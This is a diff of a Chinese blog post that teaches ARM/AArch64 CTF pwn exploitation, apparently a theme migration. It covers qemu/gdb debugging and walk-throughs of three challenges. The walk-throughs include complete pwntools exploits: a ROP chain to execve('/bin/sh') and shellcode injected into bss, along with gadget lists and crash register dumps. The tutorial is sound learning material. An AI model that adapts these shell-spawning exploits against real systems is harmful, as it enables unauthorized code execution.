@@ -1,74 +1,133 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-  <title>
-    
-    arm-pwn入门 丨
-    
-
-    tw11ty&#39;s Blog
-  </title>
-
+  <meta charset="utf-8">
   
-  <link rel="shortcut icon" href="/icon.svg">
   
-
-  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <title>arm-pwn入门 | tw11ty</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="一些师傅的博客： 关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com) arm pwn 入门 | blingbling’s blog (blingblingxuanxuan.github.io) IOT pwn_apt install mips-linux-CSDN博客 [原创] CTF 中 ARM &amp; AArch64 架构下的 Pwn-Pwn-看雪">
+<meta property="og:type" content="article">
+<meta property="og:title" content="arm-pwn入门">
+<meta property="og:url" content="http://tw11ty.github.io/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="tw11ty">
+<meta property="og:description" content="一些师傅的博客： 关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com) arm pwn 入门 | blingbling’s blog (blingblingxuanxuan.github.io) IOT pwn_apt install mips-linux-CSDN博客 [原创] CTF 中 ARM &amp; AArch64 架构下的 Pwn-Pwn-看雪">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407111228109.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121123677.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121143318.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121338981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121534727.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121341151.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121354166.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121418124.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121449651.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121507370.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121510197.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121550049.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121840669.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121841597.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122029207.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122034634.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122044100.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122045717.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122047946.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131320268.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131516580.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131528523.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142046659.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142103556.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141932654.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141946475.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947979.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947663.png">
+<meta property="article:published_time" content="2024-07-12T13:02:32.000Z">
+<meta property="article:modified_time" content="2024-07-15T03:50:00.699Z">
+<meta property="article:author" content="tw11ty">
+<meta property="article:tag" content="arm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407111228109.png">
   
-  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
-  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+    <link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
   
-
-  <!-- 字体 -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
-
   
-<link rel="stylesheet" href="/css/root.css">
-
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
   
 <link rel="stylesheet" href="/css/style.css">
 
   
-<link rel="stylesheet" href="/css/post.css">
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-<link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+  
+  
+</head>
 
 <body>
-  <header class="header">
-  <section class="header-container">
-    <a class="logo" href="/">tw11ty</a>
-    <ul class="nav">
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">tw11ty</a>
+      </h1>
       
-      <li><a href="/archives">归档</a></li>
-      
-      <li><a href="/about">关于</a></li>
-      
-      <li><a href="/group">友链</a></li>
-      
-    </ul>
-  </section>
-</header>
-  <main class="main">
-    <article class="post">
-  
-  <div class="post-title">arm-pwn入门</div>
-  <div class="post-meta">
-    <div class="date">2024 July 12th</div>
-    <div class="tags">
-      
-      <div class="tag-item">arm</div>
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">MyBlog</a>
+        </h2>
       
     </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://tw11ty.github.io"></form>
+      </div>
+    </div>
   </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-arm-pwn入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/" class="article-date">
+  <time class="dt-published" datetime="2024-07-12T13:02:32.000Z" itemprop="datePublished">2024-07-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      arm-pwn入门
+    </h1>
   
 
-  <main class="post-content"><p>一些师傅的博客：</p>
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>一些师傅的博客：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/#arm-pwn%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD">arm pwn 入门 | blingbling’s blog (blingblingxuanxuan.github.io)</a></p>
 <p><a target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/135730371?spm=1001.2014.3001.5502">IOT pwn_apt install mips-linux-CSDN博客</a></p>
@@ -321,28 +380,20 @@
 <p>shanghai_baby_arm: ELF 64-bit LSB executable, <strong>ARM aarch64</strong>, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux-aarch64.so.1, for GNU&#x2F;Linux 3.7.0, BuildID[sha1]&#x3D;e988eaee79fd41139699d813eac0c375dbddba43, stripped  –&gt; qemu-aarch模拟</p>
 </blockquote>
 <p>qemu进行模拟时使用-L加载对应架构的链接库（在usr目录下）</p>
-<pre class=" language-highlight shell"><code class="language-highlight shell">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./pwn
-qemu-arm -g 8888 -L /usr/arm-linux-gnueabihf/ ./pwn</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./pwn</span><br><span class="line">qemu-arm -g 8888 -L /usr/arm-linux-gnueabihf/ ./pwn</span><br></pre></td></tr></table></figure>
 
 <p>然后启动gdb-multiarch：</p>
-<pre class=" language-highlight shell"><code class="language-highlight shell">set architecture arm/aarch64  #指定目标架构
-target remote localhost:1234/8888</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture arm/aarch64  #指定目标架构</span><br><span class="line">target remote localhost:1234/8888</span><br></pre></td></tr></table></figure>
 
 <p><strong>运行pwn脚本时附加进程</strong>：</p>
 <p>1.给程序加个pause()，qemu模拟时设置-g port，然后gdb-multiarch附加上去。</p>
 <p>2.向群u请教后，可以通过pwntools中的attach附加进程上去。但是好像只能在程序交互前attach上去，不然会无法交互</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">io = process(&#x27;qemu-arm -L ./ -g 2222 pwnfile&#x27;.split(&#x27; &#x27;), env=env)
-gdb.attach((&#x27;127.0.0.1&#x27;, 2222), &#x27;&#x27;&#x27;b *_start&#x27;&#x27;&#x27;, exe=&#x27;pwnfile&#x27;)
-sleep(2)</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io = process(&#x27;qemu-arm -L ./ -g 2222 pwnfile&#x27;.split(&#x27; &#x27;), env=env)</span><br><span class="line">gdb.attach((&#x27;127.0.0.1&#x27;, 2222), &#x27;&#x27;&#x27;b *_start&#x27;&#x27;&#x27;, exe=&#x27;pwnfile&#x27;)</span><br><span class="line">sleep(2)</span><br></pre></td></tr></table></figure>
 
 <p>端口冲突：netstat -lnp查看占用PID    kill -9 PID 删除进程 </p>
 <p><strong>一些有关qemu的知识</strong>：qemu起的虚拟环境保护全关。关闭了ASLR：启动的地址是固定的；关闭了NX：shellcode可执行。通过判断远程环境是qemu起的还是实体机起的，如果是qemu一般直接用ret2shellcode，否则泄露+attack。即使所给的二进制文件开了NX和pie，也只是对真机环境有效，qemu中还是没有保护。</p>
 <h1 id="题目一：32位-arm架构-静态"><a href="#题目一：32位-arm架构-静态" class="headerlink" title="题目一：32位 arm架构 静态"></a>题目一：32位 arm架构 静态<a id="first"></a></h1><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121123677.png" alt="image-20240712112344579"></p>
-<pre class=" language-highlight shell"><code class="language-highlight shell">qemu-arm -g 1234 ./typo
-
-gdb-multiarch ./typo
-<span class="meta prompt_">pwndbg> </span><span class="language-bash"><span class="built_in">set</span> architecture arm</span>
-<span class="meta prompt_">pwndbg> </span><span class="language-bash">target remote localhost:1234</span></code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 ./typo</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./typo</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture arm</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:1234</span></span><br></pre></td></tr></table></figure>
 
 <p>由于是静态链接，所以函数会会很乱，定位主函数方法：</p>
 <ol>
@@ -360,8 +411,7 @@ gdb-multiarch ./typo
 <p>调用完read以后，断点下在0x00008d60</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121354166.png" alt="image-20240712135409083"></p>
 <p>R11 -&gt;  0xfffef064 —▸ 0x9058 ◂— str r0, [fp, #-0x20] &#x2F;* ‘ ‘ *&#x2F;  ，0x9058指令是readin()的下一条指令，当我们覆盖了0xfffef064中的值为布置好的shellcode地址，就能控制程序在调用完readin()后，通过r11来恢复恢复PC。偏移为0x70字节</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">pwndbg> p/x 0xfffef064-0xfffeeff4
-$1 = 0x70</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0xfffef064-0xfffeeff4</span><br><span class="line">$1 = 0x70</span><br></pre></td></tr></table></figure>
 
 <p>由于没有开NX保护，栈上shellcode可执行，可以控制R11 -&gt; shellcode_addr，但是shellcode写到栈上，需要栈地址，不过qemu起的环境没开ASLR，可以直接用栈地址返回。</p>
 <p>通过ROPgadget来打，构造ROP链，执行system(“&#x2F;bin&#x2F;sh”)，或者execve(“&#x2F;bin&#x2F;sh”, 0, 0)</p>
@@ -373,42 +423,10 @@ $1 = 0x70</code></pre>
 </blockquote>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121418124.png" alt="image-20240712141834090"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121449651.png"></p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">0x00020904 : pop &#123;r0, r4, pc&#125;
-0x00068bec : pop &#123;r1, pc&#125;
-0x00014068 : pop &#123;r7, pc&#125;
-0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;
-0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br><span class="line">0x00068bec : pop &#123;r1, pc&#125;</span><br><span class="line">0x00014068 : pop &#123;r7, pc&#125;</span><br><span class="line">0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后就是把他们组装起来</p>
-<pre class=" language-highlight python"><span class="keyword">from</span> pwn <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-context(arch=<span class="string">&#x27;arm&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)
-
-io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])
-io.sendlineafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)
-
-<span class="comment"># 0x00020904 : pop &#123;r0, r4, pc&#125;</span>
-<span class="comment"># 0x00068bec : pop &#123;r1, pc&#125;</span>
-<span class="comment"># 0x00014068 : pop &#123;r7, pc&#125;</span>
-<span class="comment"># 0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span>
-<span class="comment"># 0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</span>
-
-r0_r4 =  <span class="number">0x00020904</span>
-r1    = <span class="number">0x00068bec</span>
-r7    = <span class="number">0x00014068</span>
-r3_r4_r5 = <span class="number">0x0004df00</span>  <span class="comment">#r0=r2=0</span>
-svc   = <span class="number">0x0000fed0</span>
-bin_sh= <span class="number">0x0006C384</span>
-
-payload = flat([ cyclic(<span class="number">112</span>), p32(r3_r4_r5), p32(<span class="number">0</span>)*<span class="number">3</span>,   <span class="comment">#r2 = 0</span>
-                p32(r0_r4), p32(bin_sh) , p32(<span class="number">0</span>),        <span class="comment">#r0 = bin_sh_addr</span>
-                p32(r1), p32(<span class="number">0</span>),                         <span class="comment">#r1 = 0</span>
-                p32(r7), p32(<span class="number">0xb</span>),                       <span class="comment">#r7 = 0xb</span>
-                p32(svc)])                               <span class="comment">#pc = svc_addr</span>
-
-io.recv()
-io.sendline(payload)
-
-io.interactive()</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x00068bec : pop &#123;r1, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x00014068 : pop &#123;r7, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span></span><br><span class="line"><span class="comment"># 0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</span></span><br><span class="line"></span><br><span class="line">r0_r4 =  <span class="number">0x00020904</span></span><br><span class="line">r1    = <span class="number">0x00068bec</span></span><br><span class="line">r7    = <span class="number">0x00014068</span></span><br><span class="line">r3_r4_r5 = <span class="number">0x0004df00</span>  <span class="comment">#r0=r2=0</span></span><br><span class="line">svc   = <span class="number">0x0000fed0</span></span><br><span class="line">bin_sh= <span class="number">0x0006C384</span></span><br><span class="line"></span><br><span class="line">payload = flat([ cyclic(<span class="number">112</span>), p32(r3_r4_r5), p32(<span class="number">0</span>)*<span class="number">3</span>,   <span class="comment">#r2 = 0</span></span><br><span class="line">                p32(r0_r4), p32(bin_sh) , p32(<span class="number">0</span>),        <span class="comment">#r0 = bin_sh_addr</span></span><br><span class="line">                p32(r1), p32(<span class="number">0</span>),                         <span class="comment">#r1 = 0</span></span><br><span class="line">                p32(r7), p32(<span class="number">0xb</span>),                       <span class="comment">#r7 = 0xb</span></span><br><span class="line">                p32(svc)])                               <span class="comment">#pc = svc_addr</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
@@ -432,33 +450,7 @@ io.interactive()</code></pre>
 <p>read通过r11-0x68来设置目标地址，如果我们设置函数的返回地址为0x1052c，控制R11的值，就能实现任意地址写</p>
 <p>函数最后会将SP指针向低地址减少4字节，后面执行的 POP {R11, PC} 从SP开始，所以填充的payload长度应该为 $r11 - $r1 -4 &#x3D; 0x64，后面四字节为R11，接下来才会弹给PC。</p>
 <p>先构造任意写，往bss段上写shellcode，然后再改返回函数地址执行shellcode</p>
-<pre class=" language-highlight python"><span class="keyword">from</span> pwn <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-context(arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)
-
-<span class="comment"># io = process(&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ -g 4444 ./wARMup&#x27;, shell = True)</span>
-io = process(<span class="string">&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ ./wARMup&#x27;</span>, shell = <span class="literal">True</span>)
-
-bss = <span class="number">0x021100</span>
-payload = flat([cyclic(<span class="number">0x64</span>), p32(bss+<span class="number">0x68</span>),   <span class="comment">#r11 -> bss</span>
-                p32(<span class="number">0x01052C</span>)                  <span class="comment">#read(0, bss-0x68, 0x78)</span>
-                ])
-io.sendlineafter(<span class="string">b&#x27;Welcome to bi0s CTF!\n&#x27;</span>, payload)
-
-shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span>
-<span class="string">    add r0, pc, #12</span>
-<span class="string">    mov r1, #0</span>
-<span class="string">    mov r2, #0</span>
-<span class="string">    mov r7, #11</span>
-<span class="string">    svc 0</span>
-<span class="string">    .ascii "/bin/sh\\0"</span>
-<span class="string">&#x27;&#x27;&#x27;</span>)
-
-payload = shellcode.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(bss)
-
-<span class="comment"># pause()</span>
-
-io.send(payload)
-io.interactive()</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ -g 4444 ./wARMup&#x27;, shell = True)</span></span><br><span class="line">io = process(<span class="string">&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ ./wARMup&#x27;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x021100</span></span><br><span class="line">payload = flat([cyclic(<span class="number">0x64</span>), p32(bss+<span class="number">0x68</span>),   <span class="comment">#r11 -&gt; bss</span></span><br><span class="line">                p32(<span class="number">0x01052C</span>)                  <span class="comment">#read(0, bss-0x68, 0x78)</span></span><br><span class="line">                ])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Welcome to bi0s CTF!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    add r0, pc, #12</span></span><br><span class="line"><span class="string">    mov r1, #0</span></span><br><span class="line"><span class="string">    mov r2, #0</span></span><br><span class="line"><span class="string">    mov r7, #11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(bss)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>不过<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">ZIKH26</a>师傅的payload有些理不清</p>
 <h1 id="题目三：64位-aarch64架构-动态"><a href="#题目三：64位-aarch64架构-动态" class="headerlink" title="题目三：64位 aarch64架构 动态"></a>题目三：64位 aarch64架构 动态<a id="third"></a></h1><p>上海骇极杯 2018 baby_arm</p>
@@ -469,124 +461,21 @@ io.interactive()</code></pre>
 <p>往bss段上写数据，然后存在栈溢出</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121841597.png" alt="image-20240712184140558"></p>
 <p>aarch64指令集中：x0~x7传参  x29 栈顶指针  x30 LR</p>
-<pre class=" language-highlight assembly"><code class="language-highlight assembly"> X0   0x0
- X1   0x40007fff00 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)
- X2   0x200
- X3   0x40009b1500 ◂— 0
- X4   0x0
- X5   0x9f075092a1c1abdb
- X6   0x40009adb10 ◂— 0
- X7   0x40000000000
- X8   0x3f
- X9   0xffff
- X10  0x0
- X11  0x0
- X12  0x4000841e48 ◂— udf #0
- X13  0x0
- X14  0x0
- X15  0x6fffff47
- X16  0x411028 —▸ 0x4000901b40 ◂— stp x29, x30, [sp, #-0x30]!
- X17  0x4000901b40 ◂— stp x29, x30, [sp, #-0x30]!
- X18  0x73516240
- X19  0x400868 ◂— stp x29, x30, [sp, #-0x40]!
- X20  0x0
- X21  0x400610 ◂— mov x29, #0
- X22  0x0
- X23  0x0
- X24  0x0
- X25  0x0
- X26  0x0
- X27  0x0
- X28  0x0
- X29  0x6161617261616171 (&#x27;qaaaraaa&#x27;)
- X30  0x6161617461616173 (&#x27;saaataaa&#x27;)
- SP   0x40007fff50 ◂— 0x6161617661616175 (&#x27;uaaavaaa&#x27;)
-*PC   0x61617461616173</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> X0   0x0</span><br><span class="line"> X1   0x40007fff00 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)</span><br><span class="line"> X2   0x200</span><br><span class="line"> X3   0x40009b1500 ◂— 0</span><br><span class="line"> X4   0x0</span><br><span class="line"> X5   0x9f075092a1c1abdb</span><br><span class="line"> X6   0x40009adb10 ◂— 0</span><br><span class="line"> X7   0x40000000000</span><br><span class="line"> X8   0x3f</span><br><span class="line"> X9   0xffff</span><br><span class="line"> X10  0x0</span><br><span class="line"> X11  0x0</span><br><span class="line"> X12  0x4000841e48 ◂— udf #0</span><br><span class="line"> X13  0x0</span><br><span class="line"> X14  0x0</span><br><span class="line"> X15  0x6fffff47</span><br><span class="line"> X16  0x411028 —▸ 0x4000901b40 ◂— stp x29, x30, [sp, #-0x30]!</span><br><span class="line"> X17  0x4000901b40 ◂— stp x29, x30, [sp, #-0x30]!</span><br><span class="line"> X18  0x73516240</span><br><span class="line"> X19  0x400868 ◂— stp x29, x30, [sp, #-0x40]!</span><br><span class="line"> X20  0x0</span><br><span class="line"> X21  0x400610 ◂— mov x29, #0</span><br><span class="line"> X22  0x0</span><br><span class="line"> X23  0x0</span><br><span class="line"> X24  0x0</span><br><span class="line"> X25  0x0</span><br><span class="line"> X26  0x0</span><br><span class="line"> X27  0x0</span><br><span class="line"> X28  0x0</span><br><span class="line"> X29  0x6161617261616171 (&#x27;qaaaraaa&#x27;)</span><br><span class="line"> X30  0x6161617461616173 (&#x27;saaataaa&#x27;)</span><br><span class="line"> SP   0x40007fff50 ◂— 0x6161617661616175 (&#x27;uaaavaaa&#x27;)</span><br><span class="line">*PC   0x61617461616173</span><br></pre></td></tr></table></figure>
 
 <p>在main函数返回时，x30-&gt;‘saaataaa’ offset&#x3D;72</p>
